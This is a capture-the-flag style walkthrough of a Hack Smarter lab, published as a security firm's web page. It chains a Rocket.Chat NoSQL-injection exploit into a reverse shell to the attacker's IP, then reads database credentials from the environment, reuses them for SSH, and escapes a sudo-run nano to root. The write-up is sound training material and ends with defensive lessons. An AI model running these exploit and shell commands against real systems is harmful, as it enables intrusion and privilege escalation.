@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://challenges.cloudflare.com; style-src 'self' https://cdnjs.cloudflare.com; font-src 'self' https://cdnjs.cloudflare.com; img-src 'self' data:; connect-src 'self' https://formspree.io https://hacker-news.firebaseio.com; frame-src https://challenges.cloudflare.com; form-action 'self' https://formspree.io; base-uri 'self'; object-src 'none'; upgrade-insecure-requests">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <title>Exception Write-up (Hack Smarter) | White Rabbit Security</title>
+    <meta name="description" content="A walkthrough of the Hack Smarter Exception lab: a port a fast scan missed, a Rocket.Chat NoSQL-injection RCE, reused database credentials for SSH, and a sudo editor to root.">
+    <meta name="theme-color" content="#060b13">
+    <link rel="canonical" href="https://whiterabbitsecurity.app/learn/writeups/exception/">
+    <link rel="icon" href="/img/favicon-32.png" type="image/png" sizes="32x32">
+    <link rel="icon" href="/img/favicon-192.png" type="image/png" sizes="192x192">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <meta property="og:site_name" content="White Rabbit Security">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:title" content="Exception Write-up (Hack Smarter) | White Rabbit Security">
+    <meta property="og:description" content="A walkthrough of the Hack Smarter Exception lab: a port a fast scan missed, a Rocket.Chat NoSQL-injection RCE, reused database credentials for SSH, and a sudo editor to root.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://whiterabbitsecurity.app/learn/writeups/exception/">
+    <meta property="og:image" content="https://whiterabbitsecurity.app/wrs.jpg">
+    <meta property="og:image:alt" content="White Rabbit Security crest">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Exception Write-up (Hack Smarter) | White Rabbit Security">
+    <meta name="twitter:description" content="A walkthrough of the Hack Smarter Exception lab: a missed port, a Rocket.Chat NoSQL-injection RCE, reused DB credentials for SSH, and a sudo editor to root.">
+    <meta name="twitter:image" content="https://whiterabbitsecurity.app/wrs.jpg">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <a class="skip-link" href="#main">Skip to content</a>
+    <nav>
+        <a href="/" class="nav-logo">
+            <img src="/img/logo-mark.png" alt="White Rabbit Security" width="40" height="40">
+        </a>
+        <div class="nav-links">
+            <a href="/">Home</a>
+            <a href="/services/">Services</a>
+            <a href="/about/">About</a>
+            <a href="/news/">News</a>
+            <a href="/contact/">Contact</a>
+            <a href="/learn/" class="active" aria-current="page">Learn</a>
+        </div>
+    </nav>
+
+    <main id="main" tabindex="-1">
+        <header class="hero">
+            <h1>Exception</h1>
+            <p>Hack Smarter &middot; Linux &middot; A chat server on a port the fast scan missed carries a known NoSQL-injection flaw &mdash; and from there, a reused database password and a sudo-able editor lead to root.</p>
+            <p class="lede">A Hack Smarter lab, shared with permission. Credentials and flag values are redacted &mdash; the point is the method, not the answers.</p>
+        </header>
+
+        <section class="services" aria-labelledby="e-recon">
+            <h2 id="e-recon" class="section-title">1. Scan <span class="highlight">Everything</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>A quick RustScan shows only SSH and HTTP. But a full <code>nmap -p-</code> turns up a third service on <strong>3000</strong> that the fast scan missed &mdash; the single most important step on this box.</p>
+                <pre class="code-block"><code>rustscan -a TARGET -- -A          # 22, 80 only
+nmap -sS -p- -A TARGET            # also finds 3000</code></pre>
+                <p>Port 80 is a plain web bot with nothing useful; port 3000 is a <strong>Rocket.Chat</strong> instance (its Meteor fingerprints give it away). Always confirm a fast scan with a full port sweep.</p>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="e-rce">
+            <h2 id="e-rce" class="section-title">2. Rocket.Chat NoSQL Injection to <span class="highlight">RCE</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>This Rocket.Chat version is vulnerable to <strong>CVE-2021-22911</strong>, an unauthenticated NoSQL injection. A public proof of concept chains it into full code execution:</p>
+                <ul class="spec-list">
+                    <li><i class="fa-solid fa-database" aria-hidden="true"></i> A <code>$where</code> / <code>$regex</code> injection in an anonymous method call leaks secrets character by character &mdash; a password-reset token and a 2FA seed.</li>
+                    <li><i class="fa-solid fa-key" aria-hidden="true"></i> Those let the exploit reset the administrator's password and satisfy 2FA.</li>
+                    <li><i class="fa-solid fa-plug" aria-hidden="true"></i> As admin, it creates an incoming-webhook integration whose script runs server-side JavaScript &mdash; triggering the webhook runs a command.</li>
+                </ul>
+                <pre class="code-block"><code>python3 rocketchat.py -u LOWPRIV_EMAIL -U LOWPRIV_USER -p PASS \
+  -a ADMIN_EMAIL -A ADMIN_USER -t http://TARGET:3000 \
+  -H YOUR_IP -P 1337     # reverse shell via the integration script</code></pre>
+                <p>The shell lands as the service account running the app.</p>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="e-ssh">
+            <h2 id="e-ssh" class="section-title">3. Reused DB Password to a <span class="highlight">User</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>The application's configuration holds its MongoDB connection details &mdash; a database username and password. That password has been reused for a real local user's account, so it works straight over SSH.</p>
+                <pre class="code-block"><code>env | grep -i database     # DATABASE_USER / DATABASE_PASSWORD
+ssh USER@TARGET            # same password — user.txt</code></pre>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="e-root">
+            <h2 id="e-root" class="section-title">4. Sudo Editor to <span class="highlight">Root</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>Check sudo rights first. The user may run a &ldquo;log inspector&rdquo; helper as root without a password &mdash; and that helper opens <strong>nano</strong> as root.</p>
+                <pre class="code-block"><code>sudo -l
+# (root) NOPASSWD: /opt/log_inspector/check_log --clean
+sudo /opt/log_inspector/check_log --clean   # launches nano as root</code></pre>
+                <p>An editor running as root is a shell waiting to happen. From nano, open a command prompt and spawn a shell (GTFOBins):</p>
+                <pre class="code-block"><code># inside nano:  Ctrl+R then Ctrl+X, then run:
+reset; sh 1>&0 2>&0</code></pre>
+                <p>That drops to a root shell, and the root flag is readable.</p>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="e-lessons">
+            <h2 id="e-lessons" class="section-title">What To <span class="highlight">Take Away</span></h2>
+            <div class="service-card prose-card">
+                <ul class="spec-list">
+                    <li><i class="fa-solid fa-magnifying-glass-plus" aria-hidden="true"></i> Fast scanners trade coverage for speed. Always follow up with a full <code>-p-</code> sweep &mdash; the whole box hinged on port 3000.</li>
+                    <li><i class="fa-solid fa-comments" aria-hidden="true"></i> Match third-party apps to CVEs. Rocket.Chat 3.12.1 had a public unauthenticated RCE.</li>
+                    <li><i class="fa-solid fa-recycle" aria-hidden="true"></i> Don't reuse a service's database password for a login account.</li>
+                    <li><i class="fa-solid fa-pen-to-square" aria-hidden="true"></i> Sudo to an interactive editor (nano, vi, less) is root via GTFOBins. Scope sudo rules tightly.</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="services">
+            <div class="uplink">
+                <div class="uplink-icon"><i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i></div>
+                <h2>About the <span class="highlight">Lab</span></h2>
+                <p>Exception is a Hack Smarter Linux lab, published with the creator's permission. Hack Smarter runs realistic, engagement-style labs and training.</p>
+                <div class="hero-buttons">
+                    <a href="https://hacksmarter.org" target="_blank" rel="noopener noreferrer" class="btn btn-primary">Visit Hack Smarter</a>
+                    <a href="/learn/writeups/" class="btn btn-outline">All write-ups</a>
+                </div>
+            </div>
+        </section>
+        <section class="services">
+            <div class="service-actions"><a href="/learn/writeups/" class="btn btn-outline btn-sm">Back to Write-ups</a></div>
+        </section>
+    </main>
+    <footer class="site-footer">
+        <p>&copy; 2026 White Rabbit Security</p>
+        <p>Client information shared with us is treated as confidential. Do not send passwords or sensitive data through this site.</p>
+        <p class="footer-links"><a href="/contact/">Contact</a> <a href="/privacy/">Privacy</a> <a href="/.well-known/security.txt">security.txt</a></p>
+    </footer>
+</body>
+</html>
